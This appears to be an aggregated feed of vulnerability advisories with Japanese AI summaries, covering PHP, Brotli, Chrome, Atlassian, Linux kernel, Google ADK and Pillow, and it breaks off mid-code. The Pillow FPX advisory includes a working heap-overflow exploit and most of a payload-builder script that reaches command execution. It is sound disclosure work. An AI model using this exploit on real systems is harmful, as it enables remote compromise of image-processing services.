items.title: PHP Memory Corruption Vulnerability
items.description: PHP uses longjmp() for out-of-memory (OOM) errors to exit the current context and abort handling of the request. Some contexts may not properly account for this scenario and leave request memory in an uninitialized state before performing an allocation. The subsequent request cleanup procedure may read or branch on this memory. Multiple OOM strategies can consistently trigger this condition and lead to remote code execution (RCE).

items.title: PHP Stale Internal Request-State Vulnerability
items.description: PHP has various global state that temporarily points into request memory. In some scenarios, global state may not be correctly reset, or may be repopulated after being reset. The global state may then refer to request memory even after it has been freed. Subsequent requests may read or branch on this stale state before it is fully initialized. Multiple strategies can trigger this condition and produce remote code execution (RCE).

items.title: BrotliのC言語実装における境界外書き込みの脆弱性（CVE-2026-111497）に関する注意喚起  (公開)
items.description: JPCERT/CC の注意喚起
items.ai_analysis:
【状況】Google製の圧縮ライブラリBrotliに境界外書き込みの脆弱性（CVE-2026-111497、通称Node2Shell/HTTP2Shell）。細工したデータを展開するとクラッシュ・情報漏えい・任意コード実行の恐れ。検証コードは公開済み。10/26時点で実際の悪用報告なし
【原因の部品】Brotli（Google、C言語実装）。Node.js、Bun、Python、.NET、Java、Envoy/Istio、curl、Linuxのlibbrotliが組み込んでいる
【影響範囲】Brotli 1.0.3〜1.2.0、Node.js 22/24/26系、組み込み製品の未修正版
【対応策】
1. 更新：Brotli 1.2.1/1.1.1/1.0.10、Node.js 22.23.4/24.22.1/26.12.1。Aikidoの調べではBun 1.4.4、brotlicffi 1.2.1.0、.NET 8.0.33/9.0.22/10.0.14。Ubuntu・SUSE・RHEL標準リポジトリは未修正。更新後は再ビルド・再起動し、侵入されていないかも調査
2. 回避策：Content-Encodingにbrを含む要求をプロキシで拒否。クライアント側はbr応答の展開を無効化（Accept-Encodingの変更だけでは不十分）
【各告知の関係】
Google：元の部品の修正
Node.js：組み込み製品の更新
GitHub/NVD：CVE登録
JPCERT/CC：国内の注意喚起
【出典】
https://www.jpcert.or.jp/at/2026/at260034.html
https://www.aikido.dev/blog/python-packages-vulnerable-node2shell-brotli-cve-2026-111497

items.title: Anthropic: discovering vulnerabilities with claude
items.description: Anthropic のセキュリティ関連の発表
items.ai_analysis:
【状況】AnthropicがCVD（協調的な脆弱性開示）の手順で報告した脆弱性について、詳細を公開しました（2026/10/27）。未公開の社内モデルで主要ソフトの重大な脆弱性を見つけ、5つの攻撃チェーンを実証したものです。各社とも修正済みと説明しています。実際の悪用は未確認です。
Claude自体の脆弱性ではないため、Claude利用者側の対応は不要です。

【原因の部品】
・Chrome（V8、FedCMなど）
・Safari（WebKit/JavaScriptCore）
・Android（ロック画面とGoogle Play開発者サービス）
・Windows HTTP.sys（HTTP/3・QUIC）
・Linuxカーネルのネットワーク部分

【影響範囲】
・Chrome：156より前（CVE 62件）
・iOS/iPadOS：26.5.2より前。macOS版Safariは未確認
・Windows：CVE-2026-33096（2026年4月の更新で修正）
・Linux：CVE-2026-98432（CVSS 9.8）。認証なしで遠隔からroot権限で任意のコマンドを実行できる。修正は保守中の全stable版に反映済み。ディストリ別の修正版は未確認
・Android：修正版は未確認

【対応策】
1. 次を最優先で適用してください。
 ・Chrome 156.0.8078.47以降（Windows/Macは.47/.48）
 ・iOS/iPadOS 26.5.2以降
 ・Windowsの2026年4月以降の累積更新
 ・Linuxはディストリのカーネル更新を入れて再起動
 Chromiumベースのブラウザ（Edgeなど）の対応版は未確認です。
2. すぐ更新できない場合
 ・WindowsのHTTP/3を無効にするか、外部からの到達を制限する
 ・Linuxは、不要なMPTCPリスナー（マルチパスTCPの待受け）を止める

【各告知の関係】
・Anthropic：発見者として詳細を公開
・Google：Chrome 156で修正、Androidも修正済み
・Apple：iOS 26.5.2で修正
・Microsoft：CVE-2026-33096で修正
・Linuxカーネル：上流で修正

【出典】
https://www.anthropic.com/research/discovering-vulnerabilities-with-claude
https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02018666648.html
https://support.apple.com/en-us/127594

items.title: Google Brotli Unchecked Return Value Vulnerability
items.description:
A buffer overflow vulnerability in the Brotli decoder (c/dec/decode.c) in Google Brotli versions 1.0.3 through 1.2.0 on all platforms allows a remote unauthenticated attacker to corrupt adjacent decoder state memory, disclose sensitive memory contents, cause a denial of service, or potentially execute arbitrary code using a crafted Brotli-compressed stream.





Users need to update any Brotli libraries or binaries between 1.0.3 through 1.2.0 to the latest available version: 1.0.10 or 1.1.1 or 1.2.1.

Improper input validation in Compositing in Google Chrome prior to 156.0.8078.47 allowed a remote attacker to potentially execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: Medium)
items.ai_analysis:
【状況】Google が 10/20 に Chrome 156 安定版で修正。画面合成（Compositing）処理での入力検証の不備。細工した HTML ページを開くと、サンドボックスの外で任意のコードを実行される恐れ。Google の重要度は「中」、CVSS は 9.6。悪用は確認されておらず（KEV 未掲載、EPSS 0.4%）、詳細情報は非公開。

【原因の部品】Chromium（開発元 Google）。Chrome 以外に Edge・Brave・Opera などの Chromium 系ブラウザにも組み込まれている

【影響範囲】
・Chrome 156.0.8078.47 より前（Win/Mac/Linux）
・Edge：156.0.4314.42（10/22）は出ているが、この脆弱性の修正が入っているかは未確認
・Ubuntu の chromium-browser：対象外（snap 版をインストールするスクリプトのため）
・Android 版、iOS 版、そのほかの Chromium 系製品：未確認

【対応策】
1. Chrome を 156.0.8078.47 以上（Win/Mac は .47 または .48）に更新して再起動。管理コンソールなどで全端末のバージョンを確認する。順次配信なので、手動または管理ツールで配信を早める
2. Edge・Brave などは、各社の告知でこの CVE の修正を確認してから更新する。すぐ更新できない端末では、信頼できないサイトの閲覧を控える。回避策（設定変更など）は公表されておらず未確認

【各告知の関係】
・Google Chrome Releases：元の部品の修正（Chrome 156 で修正）
・Chromium バグ 499520020：修正の追跡用で、内容は非公開
・Ubuntu：配布物への影響判断（対象外）
・Microsoft など組み込み製品の各社の告知：未確認
・国内の注意喚起：見つかっていない

【出典】
https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02018666648.html
https://ubuntu.com/security/CVE-2026-113078

items.title: Atlassian Multiple Products Files or Directories Accessible to External Parties Vulnerability
items.description: This is a vulnerability in Bitbucket Data Center, Confluence Data Center, Jira Service Management Data Center, Jira Software Data Center, Bamboo Data Center. Crowd Data Center, Crucible and Fisheye. This Arbitrary File Access vulnerability allows an unauthenticated attacker to access specific files within the web application root directory in affected versions. Exploitation requires prior knowledge of the target file's exact name and path; this vulnerability does not allow attackers to enumerate or list directory contents. In some configurations, there may be some sensitive files that make this highly severe. This vulnerability allows an unauthenticated remote attacker to access specific files within the web application root directory in affected versions. The vulnerability must be addressed for affected versions of: -- Bitbucket Data Center, introduced in version >= 4.6.0, fix versions: 9.4.26, 10.2.8, 10.5.1 -- Confluence Data Center, introduced in version >= 5.10.0, fix versions 9.2.26, 10.2.19 -- Crowd Data Center, introduced in version >= 2.11.0, fix versions 6.3.7, 7.0.3, 7.1.7, 7.2.4 -- Jira Software Data Center, introduced in version >= 7.1.0, fix versions 9.12.40, 10.3.26, 11.3.12 -- Jira Service Management Data Center, introduced in version >= 3.1.0, fix versions 5.12.40, 10.3.26, 11.3.12 -- Bamboo Data Center >= 7.0.1, fix versions 10.2.24, 12.1.12 -- Crucible, fix versions 4.9.15 -- Fisheye, fix version 4.9.15 -- Exploitation requires prior knowledge of the target file's exact name and path. The vulnerability does not include the capability to enumerate or list directory contents.

When the http:// stream wrapper follows a redirect it forwards the user-supplied Authorization, Cookie and Proxy-Authorization headers unchanged, even when the redirect target is a different host, a different port, or a downgrade from HTTPS to HTTP. A server that can steer a redirect therefore receives credentials that were only meant for the original origin. This is the same class of issue that libcurl fixed in 7.58.0 ( CVE-2018-1000007 https://github.com/advisories/GHSA-g7x2-hrfp-pv5f ).

When the HTTP stream wrapper follows a redirect and the response carries a Location header with an empty value, the redirect code reads one byte past the end of the heap buffer holding the location. The value of that out-of-bounds byte decides which redirect target is built, so a malicious server controls whether the client is sent to the host root or to the current directory.

items.title: OpenTelemetry Python: Unbounded memory allocation in Jaeger baggage propagation
items.description: OpenTelemetry Python provides the Python API and SDK for OpenTelemetry. Prior to 1.45.0, JaegerPropagator.extract() in opentelemetry-propagator-jaeger processes inbound uberctx-* baggage values without entry, per-entry byte, or total-byte limits. Services that enable the optional Jaeger propagator can perform unnecessary CPU work and short-lived heap allocations when an untrusted carrier supplies numerous or oversized values, contributing to denial of service when transport-level limits do not constrain the input. Common default Python HTTP server limits reduce the practical impact, while custom getters, non-HTTP transports, or raised header limits increase exposure. This issue is fixed in version 1.45.0.

In the Linux kernel, the following vulnerability has been resolved:

ASoC: fsl_micfil: balance mclk enable/disable

hw_params() enables mclk unconditionally and hw_free() disables it
unconditionally, but the PCM core does not guarantee 1:1 pairing:
hw_free() can run without hw_params(), and hw_params() can be called
multiple times from the SETUP state. This triggers an "already
disabled" WARN() in the first case and leaks an enable reference in
the second, leaving the clock ungateable.

Guard both sides with the existing mclk_flag, as fsl_sai.c does with
mclk_streams.
Use after free in Microsoft Windows Search Component allows an authorized attacker to elevate privileges locally.

In the Linux kernel, the following vulnerability has been resolved:

btrfs: fix xattr replace when multiple xattrs are packed in the same item

If we have a btrfs_dir_item item that packs multiple xattrs and then we
replace the value of one of them (with the setxattr(2) family of syscalls)
with another value of a different size, we end up not having a fully
initialized btrfs_dir_item, resulting in a corruption that the tree
checker will detect at extent buffer writeback time.

This is because in btrfs_setxattr() when we find a btrfs_dir_item with
multiple xattrs (due to the crc32c hash of their name being the same)
we delete one of the xattr items (btrfs_dir_item) and then insert a new
one, but the deletion and insertion results in shifting existing data in
the leaf and therefore when the new value of a xattr has a different size,
the new btrfs_dir_item is placed in a leaf section that was not
initialized and we only copy the value's data and set the value's length
in the new btrfs_dir_item, without setting the name, the name's length,
the key (which must be all zeroes for xattrs), flags (BTRFS_FT_XATTR) and
transaction ID.

The following script reproduces the issue:

  $ cat test.sh
  #!/bin/bash

  DEV=/dev/sdi
  MNT=/mnt/sdi

  mkfs.btrfs -f $DEV
  mount $DEV $MNT

  touch $MNT/testfile

  # Add two xattrs that, on btrfs, have the same hash (crc32c) for their
  # name and therefore are packed into the same btrfs_dir_item.
  setfattr -n user.foobar -v 123 $MNT/testfile
  setfattr -n user.WvG1c1Td -v qwerty $MNT/testfile

  # Verify the xattrs are present.
  echo "xattrs before:"
  getfattr --absolute-names --dump $MNT/testfile

  # Now replace the value of the foobar xattr with a significantly larger
  # value.
  setfattr -n user.foobar -v abcdefghijklmnopqrstuvwxyz $MNT/testfile

  # Check the xattrs have the expected values.
  echo "xattrs after:"
  getfattr --absolute-names --dump $MNT/testfile

  umount $MNT

Running it:

  $ ./test.sh
  (...)
  xattrs before:
  # file: /mnt/sdi/testfile
  user.WvG1c1Td="qwerty"
  user.foobar="123"

  xattrs after:
  # file: /mnt/sdi/testfile
  user.WvG1c1Td="qwerty"

So the "user.foobar" xattr is missing and there was a transaction abort
when unmounting the fs with the following traces in dmesg:

  $ dmesg
  [869800.159271] BTRFS warning (device sdi): access to eb bytenr 30474240 len 16384 out of range start 16015 len 25964

  [869800.159296] WARNING: fs/btrfs/extent_io.c:4408 at report_eb_range+0x44/0x60 [btrfs], CPU#8: getfattr/2605179

  [869800.190527] CPU: 8 UID: 0 PID: 2605179 Comm: getfattr Tainted: G        W           7.3.0-rc3-btrfs-next-244+ #1 PREEMPT(full)
  [869800.193726] Tainted: [W]=WARN
  [869800.194502] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.16.2-0-gea1b7a073390-prebuilt.qemu.org 04/01/2014
  [869800.197576] RIP: 0010:report_eb_range+0x44/0x60 [btrfs]
  [869800.198985] Code: 48 8b 7b 18 (...)
  [869800.203531] RSP: 0018:ffffce4541937d58 EFLAGS: 00010246

  [869800.206137] RDX: 0000000000000000 RSI: 0000000000000001 RDI: ffffffffc04c92a0

In the Linux kernel, the following vulnerability has been resolved:

net/mlx5e: Prevent stale XSK buffer release on MPWQE refill retry

With AF_XDP on a striding RQ, mlx5e defers releasing XSK buffers until
an MPWQE is refilled. If XSK allocation then returns -ENOMEM,
actual_wq_head is not advanced and a later NAPI poll retries the same
WQE.

mlx5e_free_rx_mpwqe() leaves each released slot marked as releasable. On
retry it can therefore call xsk_buff_free() again through stale pointers
after the frames have returned to the XSK pool and been reallocated.

Set all skip_release_bitmap bits in the common error path of
mlx5e_xsk_alloc_rx_mpwqe(). This matches mlx5e_alloc_rx_mpwqe(). A
successful allocation already clears the bitmap after replacing every
buffer, so retries become idempotent without changing the success path.

Fault injection forced three consecutive failures for one selected MPWQE.
Both an early allocation failure and a partial 8-of-16-buffer unwind
released the original 16 XSK buffers only once. Each error left a full
bitmap, the following NAPI retry skipped the release, and a later
successful allocation cleared it. A 20-second AF_XDP zero-copy pressure
run exercised 1,575,262 buffer allocation failures without invalid
descriptors, WQE errors, or kernel warnings.

In the Linux kernel, the following vulnerability has been resolved:

net/mlx5e: Prevent stale XSK buffer release on refill retry

When an XDP redirect to an AF_XDP socket fails because its RX ring is
full, the XSK core frees the buffer. During the subsequent batched refill
of a legacy cyclic RQ, mlx5e also releases the WQE's XSK buffer before
allocating a replacement. If that refill succeeds only partially, a WQE
left without a replacement retains its old buffer pointer.

The buffer can meanwhile be allocated to another WQE. A later refill
retry can then free the live buffer through the stale pointer and publish
the same UMEM frame twice.

Mark the WQE as released immediately after the driver-side free. The flag
is already cleared when a replacement buffer is assigned, so refill
retries no longer release stale pointers.

The failure is silent and produces no kernel warning or splat. A
standalone legacy cyclic-RQ zero-copy libxsk reproducer, using 64-byte UDP
traffic offered at 12 Mpps, detected it: stock stopped after 2,854,914
packets in 4.094 seconds, with 4,542 xdp_rx_ring_full events and 64
ownership/double-publication errors. With this change it processed
356,904,225 packets in 30 seconds despite 571,405 xdp_rx_ring_full events,
with no ownership or data errors.

In the Linux kernel, the following vulnerability has been resolved:

ipv4: free inet_opt and ireq_opt after an RCU grace period

tcp_v4_syn_recv_sock() transfers ownership of ireq->ireq_opt to the
child socket (newinet->inet_opt) without copying it.

Another cpu can concurrently process a retransmitted SYN for the same
request socket, and send a SYNACK from tcp_check_req().
tcp_v4_send_synack() and inet_csk_route_req() read ireq->ireq_opt
under rcu_read_lock() only, and ip_build_and_send_pkt() and
ip_options_build() then read opt->optlen twice.

Note that the SYNACK timer itself is not an issue: it holds a
reference on its request socket, and inet_csk_reqsk_queue_drop()
calls timer_delete_sync() before the child can be freed.

Since commit 079096f103fa ("tcp/dccp: install syn_recv requests
into ehash table"), request sockets are processed without holding
the listener lock, so nothing prevents the child socket from being
freed while the SYNACK is still being built. TCP child sockets do
not have SOCK_RCU_FREE, and inet_sock_destruct() frees inet_opt
with a plain kfree(), leading to a use-after-free in
ip_options_build().

A similar issue exists with request socket migration
(net.ipv4.tcp_migrate_req=1, or a BPF_SK_REUSEPORT_SELECT_OR_MIGRATE
program). reqsk_timer_handler() clones the request socket with
inet_reqsk_clone(), so that the old request socket and its clone
share the same ireq_opt, then reqsk_migrate_reset() clears the
pointer in the old one. Another cpu holding a reference on the old
request socket can still be using these options (sending a SYNACK,
or creating a child in tcp_v4_syn_recv_sock()) when the clone is
freed, and tcp_v4_reqsk_destructor() also uses a plain kfree().

Readers already use RCU, and other paths replacing inet_opt
(do_ip_setsockopt(), cipso_v4_sock_setattr()...) already use
kfree_rcu(). Use kfree_rcu() in inet_sock_destruct() and
tcp_v4_reqsk_destructor() as well.

IPv6 is not affected by the first issue, because tcp_v6_syn_recv_sock()
duplicates the options. tcp_v6_reqsk_destructor() has the same
migration issue with ipv6_opt, which is only set by CALIPSO. This
will be addressed in a separate patch.

In the Linux kernel, the following vulnerability has been resolved:

net: openvswitch: conntrack: fix helper UAF due to extensions realloc

While calling the helpers, a raw pointer to the extensions area is
wired into expectations list:

  -> nf_ct_helper()
   -> helper->help()
    -> nf_ct_expect_related_report()
     -> nf_ct_expect_insert()
      -> hlist_add_head_rcu(&exp->lnode, &master_help->expectations)

In case the connection is not confirmed yet, more extensions can be
added afterwards with *_ext_add() calls reallocating the extension
space and leaving the now invalid pointer in the expectations list
that is later accessed while removing the expectation.

Make sure that helpers are called at the end after all the other
extensions are already added.

Note that the helper rejection now leaves the mark and labels set,
but that's not different from how the NAT was handled before or how
the mark and the labels were handled on confirmation failure.  And
there are no atomicity guarantees provided by the API anyway.

In the Linux kernel, the following vulnerability has been resolved:

sctp: discard the rest of the packet on a stale-cookie error

When an association is in COOKIE-ECHOED state and the peer sends a
bundled [ERROR(Stale Cookie)][DATA] packet from one of its non-primary
addresses, processing the ERROR chunk takes the non-fatal stale-cookie
retry path sctp_sf_do_5_2_6_stale(), which queues
SCTP_CMD_DEL_NON_PRIMARY while keeping the association alive.
sctp_cmd_del_non_primary() removes every non-primary transport -
including the very transport this packet arrived on, which is still
referenced by the receive lookup and shared by all chunks of the
packet via chunk->transport.

sctp_assoc_rm_peer() does redirect asoc->peer.last_data_from away from
the removed transport, but right afterwards the bundled DATA chunk
makes sctp_assoc_bh_rcv() re-register
asoc->peer.last_data_from = chunk->transport unconditionally, undoing
the redirection with the just-removed transport.

Once the packet is done, the receive reference is dropped and the
transport is RCU-freed, while the surviving association keeps the
dangling last_data_from.  A later FWD-TSN (or the delayed SACK timer)
makes sctp_gen_sack() dereference it (->param_flags and friends), and
sctp_make_sack()/sctp_outq_select_transport() may write to the freed
object and link it into the live transport list.  This is a
use-after-free triggerable by any malicious SCTP peer (or a local
unprivileged user acting as one) with no capabilities required:

  BUG: KASAN: slab-use-after-free in sctp_do_sm+0x498a/0x5660
  Read of size 4 at addr ffff88800e1e356c by task poc/115
  Call Trace: sctp_do_sm <- sctp_assoc_bh_rcv <- sctp_inq_push <-
              sctp_rcv <- ip_protocol_deliver_rcu <- ip_rcv
  Allocated: sctp_transport_new <- sctp_assoc_add_peer <-
             sctp_process_init (INIT-ACK processing)
  Freed: kfree <- sctp_transport_destroy_rcu <- rcu_core
         (call_rcu queued by sctp_transport_put at end of sctp_rcv)
  The buggy address is located 364 bytes inside of freed 1024-byte
  region [ffff88800e1e3400, ffff88800e1e3800), cache kmalloc-1k

Note that commit 03a9d10ecf71 ("sctp: drop a chunk if its transport
was removed") only covers the window between the receive lookup and
the chunk processing (e.g. an ASCONF DEL-IP racing the socket backlog);
here the transport is removed *while* the packet is being processed,
by an earlier chunk of the same packet, so the drop in sctp_inq_push()
does not reach this path.  Verified with the bundled [ERROR(Stale
Cookie)][DATA] + FWD-TSN reproducer: the KASAN report above still
fires with that commit applied, and is gone with this patch on top.

Fix it by discarding the rest of the packet on this path, as suggested
by Xin.  After the stale-cookie ERROR has sent the association back to
COOKIE-WAIT and removed the non-primary transports, the remaining
chunks of the packet can only run against the restarted handshake
while referencing the removed arrival transport through
chunk->transport: besides the last_data_from registration above,
sctp_cmd_setup_t2() and the sctp_make_*() reply builders would also
copy that pointer into association-lifetime state that
sctp_assoc_rm_peer() has already sanitized.  Let the peer retransmit
them, in line with what sctp_inq_push() does for chunks whose
transport was removed before processing.

items.title: Cross-Application Artifact Namespace Isolation in Google Agent Development Kit (ADK) for Python
items.description: Exposure of Resource to Wrong Sphere (CWE-668) in FileArtifactService in Google Agent Development Kit (ADK) for Python (google-adk) versions 1.19.0 before 1.39.1 and 2.0.0a1 before 2.7.0 allows a caller in one application to list, read, overwrite, or delete artifacts belonging to another application when both applications share a FileArtifactService root directory and use the same user_id (and session_id for session-scoped artifacts). FileArtifactService accepted app_name across its public API methods but omitted app_name when constructing on-disk paths (root/users/{user_id}/... instead of root/apps/{app_name}/users/{user_id}/...). Version 2.6.0 scoped writes by app_name but retained a legacy root/users/{user_id} fallback for reads and deletes; version 2.7.0 and the 1.x backport in version 1.39.1 removed the fallback and enforce full per-app path scoping.

items.title: Pillow: Heap buffer overflow in FlashPix (FPX) JPEG decoding leads to code execution
items.description:
### Credits

**Researcher**: Alex Bouffard (mixbo@pebwalker.com)

### Summary

A heap buffer overflow in Pillow's FlashPix (FPX) JPEG-tile decoder lets an attacker achieve arbitrary code execution by getting an application to open a single crafted file with `Image.open()`. The file is recognized by content (the OLE2 magic), not by extension, so any service that opens or thumbnails untrusted uploads with the optional `olefile` dependency installed is reachable with no user interaction. In the PoC below, opening one crafted file executes an attacker-chosen command on stock Pillow 12.2.0 (x86_64 Ubuntu 24.04, glibc 2.39).

### Details

`FpxImagePlugin` decodes FlashPix (FPX) files, which are OLE2/CFBF compound documents.

`Image.open()` auto-detects them from the OLE2 magic `D0CF11E0...` whenever the optional `olefile` package is installed (Pillow's documented dependency for FPX/MIC support), regardless of the file's extension.

For a JPEG-compressed subimage (`compression == 2`), the plugin builds a `"jpeg"` decode tile and derives the `(rawmode, jpegmode)` pair from attacker-controlled FPX color IDs through the `MODES` table ([`src/PIL/FpxImagePlugin.py` L25-L32](https://github.com/python-pillow/Pillow/blob/12.2.0/src/PIL/FpxImagePlugin.py#L25-L32)):

```python
MODES = {
    ...
    (0x00018000, 0x00017FFE): ("RGBA", "LA"),                # rawmode "LA"  (2 bytes/pixel)
    ...
    (0x00020000, 0x00020001, 0x00020002): ("RGB", "YCC;P"),  # rawmode "YCC;P"
}
```

The Imaging output buffer for the tile is sized for the rawmode (here `"LA"` = 2 bytes/pixel) ([`src/decode.c` L223-L226](https://github.com/python-pillow/Pillow/blob/12.2.0/src/decode.c#L223-L226)):

```c
state->bytes = (state->bits * state->xsize + 7) / 8;   // "LA" gives 2 * xsize bytes/row
...
state->buffer = (UINT8 *)calloc(1, state->bytes);
```

In `JpegDecode.c` the rawmode string is mapped to a libjpeg `out_color_space`. Recognized modes (`CMYK`, `YCbCr`, `YCbCrK`, and so on) get a concrete colorspace, but `"LA"` and `"YCC;P"` are not recognized, so control reaches the fallback branch ([`src/libImaging/JpegDecode.c` L219-L221](https://github.com/python-pillow/Pillow/blob/12.2.0/src/libImaging/JpegDecode.c#L219-L221)):

```c
/* Disable decoder conversions. */
context->cinfo.jpeg_color_space = JCS_UNKNOWN;
context->cinfo.out_color_space  = JCS_UNKNOWN;
```

Under `JCS_UNKNOWN`, libjpeg performs no color conversion and emits `cinfo.num_components` bytes per pixel, taken from the embedded JPEG's SOF marker, which the attacker sets to 4. So `jpeg_read_scanlines` writes `4 * width` bytes per row into a buffer allocated for only `2 * width` bytes ([`src/libImaging/JpegDecode.c` L252](https://github.com/python-pillow/Pillow/blob/12.2.0/src/libImaging/JpegDecode.c#L252)):

```c
ok = jpeg_read_scanlines(&context->cinfo, &state->buffer, 1);   // writes 4*W into a 2*W buffer
```

This is a heap out-of-bounds write with attacker-controlled length (the image width, up to tens of thousands of pixels, so about `2 * width` bytes of overflow per row) and attacker-controlled content (the decoded pixel data). The PoC weaponizes it: the overflow overwrites an adjacent Python `bytes` object's `ob_type` with a pointer to a fake `PyTypeObject` / `PyBufferProcs` vtable that the same overflow plants inside the decode buffer. When Pillow releases the input buffer, `PyBuffer_Release` walks `ob_type -> tp_as_buffer -> bf_releasebuffer` and executes `call *rax`; the PoC points that at `system@plt` (fixed, the interpreter binary is non-PIE) with `rdi` set to the command string, yielding command execution.

### PoC

To facilitate an exact reproduction on an x86_64 machine, this PoC uses the version-pinned, ASLR-disabled Docker image from [Annex A](#annex-a-docker-setup).

The source code for the payload builder `make_payload.py` is in [Annex B](#annex-b-payload-builder-source).

`vulnerable.py` is the program under test, a one-liner that opens the file it is given:

```python
#!/usr/bin/env python3
# The entire vulnerable operation an application performs on an untrusted file.
import sys
from PIL import Image

Image.open(sys.argv[1]).load()
```

The payload is a standalone `.fpx` file the attacker crafts on their own host; the target only ever opens the resulting file, so building it requires no access to or code execution on the target. We run `make_payload.py` inside the same container here purely for convenience, so its baked-in addresses (`--offset`, `system@plt`) match this pinned image. The payload redirects the hijacked indirect call to `system@plt` (`0x4206c0`, fixed because the interpreter binary is non-PIE) with a baked-in command:

```console
$ python3 make_payload.py --target 0x4206c0 --cmd id --out shell.fpx
[control] shell.fpx: S=0xdc8800 target=0x4206c0 cmd='id' craft_iters=0 bad=0
[control] opening it: vtable hijack -> call *0x4206c0 with rdi -> 'id'
```

Then open it with `vulnerable.py`:

```console
$ python3 vulnerable.py shell.fpx
uid=0(root) gid=0(root) groups=0(root)
corrupted size vs. prev_size
```

`Image.open()` of the crafted file runs the baked command via `system("id")`: command execution as the user running the image processing (root in the container).

The trailing `corrupted size vs. prev_size` is glibc aborting during interpreter teardown over the corrupted heap, after `id` has
already run.

The builder writes the command inline at the hijacked `rdi`, so `--cmd` is limited to 7 bytes (for example `id`, `id;w`). `--offset` and `system@plt` are constants of the pinned, ASLR-disabled image and hold across runs of it.

### Impact

This is a heap-based buffer overflow (CWE-122) / out-of-bounds write (CWE-787) that leads to code execution. Any application or service that opens attacker-influenced files with Pillow and has the optional `olefile` dependency installed is affected: image upload and thumbnailing services, avatar and media processing, document and image conversion pipelines, and similar. Because detection is by OLE2 magic rather than file extension and the overflow is triggered during a normal `Image.open()` / `load`, a server that automatically processes an uploaded file is exploitable with no user interaction. The result is arbitrary command execution in the context of the process performing the image processing, leading to full compromise of that process and the data and privileges it holds.

### Annex A: Docker setup

The PoC runs in a pinned Docker image so the environment is deterministic; the image installs a version-pinned Python (3.12.3) and the Pillow 12.2.0 wheel, and the builder is pure Pillow. The image's entrypoint disables ASLR (`setarch -R`) to reduce the system knowledge requirements. The single `--security-opt seccomp=unconfined` flag on `docker run` is required only because turning ASLR off uses the `personality()` syscall that Docker's default seccomp profile blocks. Run only on infrastructure you own.

**1. Build the image.** Put `vulnerable.py` (PoC) and `make_payload.py`
([Annex B](#annex-b-payload-builder-source)) in a directory with this `Dockerfile`:

```dockerfile
FROM ubuntu:24.04@sha256:786a8b558f7be160c6c8c4a54f9a57274f3b4fb1491cf65146521ae77ff1dc54
```

### Annex B: payload builder source

`make_payload.py`:

```python
#!/usr/bin/env python3
"""F-JPEG-1 payload builder for a 0-ASLR box (x86_64 + glibc), pure Pillow (no native toolchain).
Builds an .fpx whose embedded 4-component JPEG, decoded via Pillow's FpxImagePlugin -> JCS_UNKNOWN
path, overflows the 2-byte/px decode buffer and overwrites an adjacent object's ob_type.
  --crash      flood an adjacent ob_type with 0x42.. -> SIGSEGV in PyBuffer_Release
  (default)    CONTROL: fake vtable at the fixed (no-ASLR) addresses -> call *--target
Defaults target the pinned Docker image with ASLR disabled (setarch -R). See --help."""
import sys, io, struct, math, argparse
from PIL import Image

W, H = 65000, 2
SECT, OB_TYPE_OFF, DATA_PAD, SENTINEL = 512, 130024, 0x18000, 0x4142434445464748
FREESECT, ENDOFCHAIN, FATSECT, NOSTREAM = 0xFFFFFFFF, 0xFFFFFFFE, 0xFFFFFFFD, 0xFFFFFFFF
FPX_CLSID = bytes.fromhex("0067615654C1CE11855300AA00A1F95B")
o32 = lambda v: struct.pack("<I", v)
p64 = lambda v: struct.pack("<Q", v)
INV = bytes(255 - i for i in range(256))   # 8-bit inversion table

def jpeg(src):
    b = io.BytesIO()
    Image.frombytes("CMYK", (W, H), bytes(src)).save(b, "JPEG", quality=100, subsampling=0)
    return b.getvalue()

def decode_row(jpg):
    # Predict what the vulnerable JCS_UNKNOWN path decodes, using Pillow itself: JCS_UNKNOWN emits
    # the raw JPEG components R, while Pillow's own CMYK decode of the same file returns 255 - R
    # (the Adobe-CMYK inversion). So 255 - Image.open(jpg) is exactly the vulnerable output. The
    # last decoded row is the one that lands in (and overflows past) the buffer.
    px = Image.open(io.BytesIO(jpg)).tobytes()
    return px[(H - 1) * W * 4:].translate(INV)

def craft(targets, iters=40):  # decode-feedback exact write (JPEG is lossy -> iterate to converge)
    # base fill 0xBD -> decodes to 0x42, so the overflow GAPS match the crash-mode flood pattern
    # that reaches PyBuffer_Release cleanly (uniform 0x42 avoids a premature glibc free() abort).
    src = bytearray(b"\xbd" * (W * H * 4)); base = (H - 1) * W * 4; it = 0
    for off, t in targets:
        for i, v in enumerate(t): src[base + off + i] = src[off + i] = 255 - v
    for it in range(iters):
        dec = decode_row(jpeg(src)); bad = 0
        for off, t in targets:
            for i, v in enumerate(t):
                if dec[off + i] != v:
                    bad += 1
                    src[base + off + i] = src[off + i] = max(0, min(255, src[base + off + i] + dec[off + i] - v))
        if not bad: break
    return jpeg(src), it, bad

def maxid_for(w, h):
    s, i = max(w, h), 1
    while s > 64: s //= 2; i += 1
    return i - 1
MAXID = maxid_for(W, H); RESNAME = "Resolution %04d" % MAXID

def image_contents():
    ui4 = lambda v: o32(19) + o32(v); blob = lambda b: o32(65) + o32(len(b)) + b
    cb = o32(1) + o32(2) + o32(0x00018000) + o32(0x00017FFE)        # FPX color -> rawmode "LA"
    props = [(0x1000002, ui4(W)), (0x1000003, ui4(H)), (0x2000002 | (MAXID << 16), blob(cb))]
    voff = 8 + 8 * len(props); idx = vals = b""
    for pid, v in props: idx += o32(pid) + o32(voff); vals += v; voff += len(v)
    body = o32(len(props)) + idx + vals
    return (struct.pack("<HHI", 0xFFFE, 0, 0x00020005) + b"\x00" * 16 + o32(1) + b"\x00" * 16
            + o32(48) + o32(len(body) + 4) + body)

def subimage_header():
    b = bytearray(80)
    for o, v in [(32, W), (36, H), (40, 1), (44, max(W, 256)), (48, max(H, 256)), (52, 2),
                 (56, 36), (60, 16), (64, 0), (72, 2)]:
        struct.pack_into("<I", b, o, v)
    return bytes(b)

def build_fpx(jpg, out):
    data = b"\x00" * 28 + jpg
    assert len(data) <= DATA_PAD, (len(data), DATA_PAD)
    pad = lambda x: x + b"\x00" * ((-len(x)) % SECT)
    sd = {"ic": pad(image_contents().ljust(4096, b"\x00")),
          "hdr": pad(subimage_header().ljust(4096, b"\x00")),
          "dat": pad(data.ljust(DATA_PAD, b"\x00"))}
    ns = lambda x: len(x) // SECT; order = ["ic", "dat", "hdr"]
